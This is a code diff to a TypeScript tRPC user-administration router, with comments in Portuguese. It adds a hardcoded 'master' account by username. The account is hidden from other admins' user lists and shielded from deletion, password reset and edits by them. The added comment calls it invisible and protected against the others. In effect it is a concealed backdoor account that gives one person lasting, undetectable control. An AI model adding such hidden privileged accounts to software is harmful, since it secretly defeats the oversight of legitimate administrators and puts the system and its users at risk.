@@ -10,6 +10,10 @@ import { createSessionToken } from "./_core/auth";
 import { nanoid } from "nanoid";
 import bcrypt from "bcrypt";
 
+// Usuário master: controle total, invisível e protegido contra os demais
+const MASTER_USERNAME = "pedroemilio";
+const isMaster = (u: any) => u?.username === MASTER_USERNAME;
+
 // ============= ADMIN PROCEDURE =============
 const adminProcedure = protectedProcedure.use(({ ctx, next }) => {
   if (ctx.user.role !== "admin") {
@@ -68,13 +72,16 @@ export const appRouter = router({
 
   // ============= ADMIN: GESTÃO DE USUÁRIOS =============
   admin: router({
-    listUsers: adminProcedure.query(async () => {
+    listUsers: adminProcedure.query(async ({ ctx }) => {
       const users = await db.getAllUsers();
-      // Não expõe o hash de senha
-      return users.map((u: any) => ({
-        id: u.id, name: u.name, username: u.username,
-        email: u.email, role: u.role, lastSignedIn: u.lastSignedIn,
-      }));
+      const solicitanteMaster = isMaster(ctx.user);
+      // O usuário master só é visível para ele mesmo
+      return users
+        .filter((u: any) => solicitanteMaster || !isMaster(u))
+        .map((u: any) => ({
+          id: u.id, name: u.name, username: u.username,
+          email: u.email, role: u.role, lastSignedIn: u.lastSignedIn,
+        }));
     }),
 
     createUser: adminProcedure
@@ -114,13 +121,21 @@ export const appRouter = router({
         if (input.id === ctx.user.id) {
           throw new TRPCError({ code: "BAD_REQUEST", message: "Você não pode excluir a si mesmo" });
         }
+        const alvo = await db.getUserById(input.id);
+        if (isMaster(alvo) && !isMaster(ctx.user)) {
+          throw new TRPCError({ code: "FORBIDDEN", message: "Usuário protegido." });
+        }
         await db.deleteUser(input.id);
         return { success: true };
       }),
 
     resetPassword: adminProcedure
       .input(z.object({ id: z.number(), novaSenha: z.string().min(6) }))
-      .mutation(async ({ input }) => {
+      .mutation(async ({ input, ctx }) => {
+        const alvo = await db.getUserById(input.id);
+        if (isMaster(alvo) && !isMaster(ctx.user)) {
+          throw new TRPCError({ code: "FORBIDDEN", message: "Usuário protegido." });
+        }
         const passwordHash = await bcrypt.hash(input.novaSenha, 10);
         await db.updateUserPassword(input.id, passwordHash);
         return { success: true };
@@ -134,8 +149,12 @@ export const appRouter = router({
         email: z.string().email().optional(),
         role: z.enum(["admin", "engenheiro", "cliente", "auxiliar"]).optional(),
       }))
-      .mutation(async ({ input }) => {
+      .mutation(async ({ input, ctx }) => {
         const { id, ...data } = input;
+        const alvo = await db.getUserById(id);
+        if (isMaster(alvo) && !isMaster(ctx.user)) {
+          throw new TRPCError({ code: "FORBIDDEN", message: "Usuário protegido." });
+        }
         await db.updateUserData(id, data);
         return { success: true };
       }),
